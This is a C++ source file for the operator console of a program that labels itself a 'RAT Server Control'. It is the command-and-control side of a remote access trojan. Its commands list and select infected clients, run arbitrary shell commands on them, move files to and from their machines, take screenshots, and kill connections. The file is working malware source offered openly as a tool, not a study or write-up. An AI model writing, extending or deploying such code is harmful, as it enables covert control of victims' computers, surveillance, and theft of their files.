#include "ServerCommandController.hpp"
#include "ServerManager.hpp"
#include "ServerLogController.hpp"
#include "ServerFileController.hpp"
#include "Utils/Base64.hpp"
#include <iostream>
#include <sstream>
#include <fstream>
#include <chrono>
#include <termios.h>
#include "Utils/TCPSocket.hpp"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstdlib>
#include <nlohmann/json.hpp>

namespace Server {

ServerCommandController::ServerCommandController(ServerManager *manager) : IController(manager), manager(manager) {}
ServerCommandController::~ServerCommandController() { stop(); }

void ServerCommandController::start() {
    if (running) return;
    running = true;

    
    if (isatty(STDIN_FILENO)) {
        stdinThread = std::make_unique<std::thread>(&ServerCommandController::stdinLoop, this);
    }
}

void ServerCommandController::handle(const nlohmann::json &packet) {
    
    std::lock_guard<std::mutex> lock(bashMtx);
    bashResponses.push(packet);
}



std::string ServerCommandController::processLine(const std::string &line) {
    std::istringstream iss(line);
    std::string cmd; iss >> cmd;
    std::string reply;
    if (cmd == "help") {
        return handleHelp();
    } else if (cmd == "list") {
        return handleList();
    } else if (cmd == "choose") {
        std::string name; iss >> name;
        return handleChoose(name);
    } else if (cmd == "kill") {
        std::string name; iss >> name;
        return handleKill(name);
    } else if (cmd == "killall") {
        return handleKillAll();
    } else if (cmd == "bash") {
        std::string name; iss >> name;
        std::string rest;
        std::getline(iss, rest);
        if (!rest.empty() && rest.front() == ' ') rest.erase(0,1);
        return handleBash(name, rest);
    } else if (cmd == "download") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, remotePath, localPath;
        if (manager->hasClient(arg1)) {
            name = arg1;
            remotePath = arg2;
            localPath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            remotePath = arg1;
            localPath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient : name;
        ServerFileController fileCtrl(manager);
        return fileCtrl.handleDownload(targetClient, remotePath, localPath);
    } else if (cmd == "upload") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, localPath, remotePath;
        if (manager->hasClient(arg1)) {
            name = arg1;
            localPath = arg2;
            remotePath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            localPath = arg1;
            remotePath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient : name;
        ServerFileController fileCtrl(manager);
        return fileCtrl.handleUpload(targetClient, localPath, remotePath);
    } else if (cmd == "screenshot") {
        std::string name; iss >> name;
        return handleScreenshot(name);
    } else if (cmd == "quit") {
        return handleQuit();
    } else if (cmd == "showlogs") {
        return handleShowLogs();
    }
    return std::string("Unknown command\n");
}

std::string ServerCommandController::handleList() {
    if (!manager) return "Error\n";
    auto clients = manager->listClients();
    if (clients.empty()) return "No clients\n";
    std::string r = "Clients:\n";
    for (auto &c : clients) {
        r += "  - " + c + " (" + manager->getClientIP(c) + ")\n";
    }
    return r;
}

std::string ServerCommandController::handleHelp() {
    std::string h;
    h += "\nCommands:\n";
    h += "  list, choose <client>, kill [client], killall\n";
    h += "  bash [client] <cmd>, screenshot [client]\n";
    h += "  download [client] <remote> [local]\n";
    h += "  upload [client] <local> [remote]\n";
    h += "  showlogs, quit\n";
    return h;
}

std::string ServerCommandController::handleChoose(const std::string &name) {
    if (!manager) return "Manager not available\n";
    if (name.empty()) return "Invalid client name\n";
    if (name.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    if (manager->hasClient(name)) {
        selectedClient = name;
        return std::string("Selected client: ") + name + "\n";
    }
    return std::string("No such client\n");
}

std::string ServerCommandController::handleKill(const std::string &name) {
    if (!manager) return "Error: Manager not available\n";
    
    std::string targetClient = name.empty() ? selectedClient : name;
    
    if (targetClient.empty()) {
        return "Error: No client specified and no client selected\n";
    }
    
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Error: Invalid characters in client name\n";
    }
    
    
    if (manager->hasClient(targetClient)) {
        nlohmann::json killCmd{{"controller", "kill"}};
        manager->sendRequest(targetClient, killCmd);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    
    
    if (manager->removeClient(targetClient)) {
        if (targetClient == selectedClient) selectedClient.clear();
        return "OK\n";
    }
    return "Not found\n";
}

std::string ServerCommandController::handleKillAll() {
    if (!manager) return "Error\n";
    auto clients = manager->listClients();
    if (clients.empty()) return "No clients\n";
    
    nlohmann::json killCmd{{"controller", "kill"}};
    for (const auto &c : clients) manager->sendRequest(c, killCmd);
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    
    int n = 0;
    for (const auto &c : clients) if (manager->removeClient(c)) n++;
    selectedClient.clear();
    return "Disconnected " + std::to_string(n) + " client(s)\n";
}

std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
    if (!manager) return "Error\n";
    
    std::string targetClient, command;
    if (name.empty()) {
        if (selectedClient.empty()) return "No client\n";
        targetClient = selectedClient;
        command = cmd;
    } else if (manager->hasClient(name)) {
        targetClient = name;
        command = cmd;
    } else {
        if (selectedClient.empty()) return "Not found\n";
        targetClient = selectedClient;
        command = name + (cmd.empty() ? "" : " " + cmd);
    }
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
    if (command.empty()) return "Empty\n";
    
    nlohmann::json req{{"controller", "bash"}, {"cmd", command}};
    if (!manager->sendRequest(targetClient, req)) return "Failed\n";
    
    nlohmann::json resp;
    if (manager->receiveResponse(targetClient, resp, 5000)) {
        if (resp.contains("out") && resp["out"].is_string()) {
            return resp["out"].get<std::string>();
        }
    }
    return "No response\n";
}

std::string ServerCommandController::handleScreenshot(const std::string &name) {
    if (!manager) return "Error\n";
    std::string targetClient;
    if (name.empty()) {
        if (selectedClient.empty()) return "No client\n";
        targetClient = selectedClient;
    } else if (manager->hasClient(name)) {
        targetClient = name;
    } else {
        return "Not found\n";
    }
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
    
    nlohmann::json req{{"controller", "screenshot"}, {"action", "take"}};
    if (!manager->sendRequest(targetClient, req)) return "Failed\n";
    
    nlohmann::json resp;
    if (!manager->receiveResponse(targetClient, resp, 10000)) return "Timeout\n";
    if (!resp.contains("success") || !resp["success"].get<bool>()) return "Failed\n";
    if (!resp.contains("data")) return "No data\n";
    
    std::string img = Utils::base64_decode(resp["data"].get<std::string>());
    
    auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::string fn = "/tmp/ss_" + targetClient + "_" + std::to_string(t) + ".png";
    std::ofstream of(fn, std::ios::binary);
    if (!of) return "Save failed\n";
    of.write(img.data(), img.size());
    of.close();
    system(("xdg-open '" + fn + "' 2>/dev/null &").c_str());
    return "OK\n";
}

bool ServerCommandController::popBashResponse(nlohmann::json &out, int timeoutMs) {
    auto start = std::chrono::steady_clock::now();
    while (true) {
        {
            std::lock_guard<std::mutex> lock(bashMtx);
            if (!bashResponses.empty()) {
                out = bashResponses.front();
                bashResponses.pop();
                return true;
            }
        }
        
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start).count();
        if (elapsed >= timeoutMs) return false;
        
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

std::string ServerCommandController::handleQuit() {
    running = false;
    if (manager) {
        manager->stop();
        std::cout << "\nServer shutting down..." << std::endl;
    }
    std::exit(0);
    return std::string();
}

std::string ServerCommandController::handleShowLogs() {
    if (!manager) {
        return "Error: Manager not available\n";
    }
    
    auto *logController = dynamic_cast<ServerLogController*>(
        manager->getSystemController("log"));
    
    if (!logController) {
        return "Error: Log controller not available\n";
    }
    
    return logController->showLogs();
}



void ServerCommandController::stdinLoop() {
    std::string line;
    std::cout << "\n=== RAT Server Control ===" << std::endl;
    std::cout << "Type 'help' for available commands\n" << std::endl;
    
    while (running) {
        if (!selectedClient.empty()) {
            std::cout << "[" << selectedClient << "] > " << std::flush;
        } else {
            std::cout << "\n> " << std::flush;
        }
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;
        
        std::string reply = processLine(line);
        if (!reply.empty()) {
            std::cout << reply << std::flush;
        }
    }
}

void ServerCommandController::stop() {
    if (!running) return;
    running = false;
    if (stdinThread && stdinThread->joinable()) stdinThread->join();
}

}
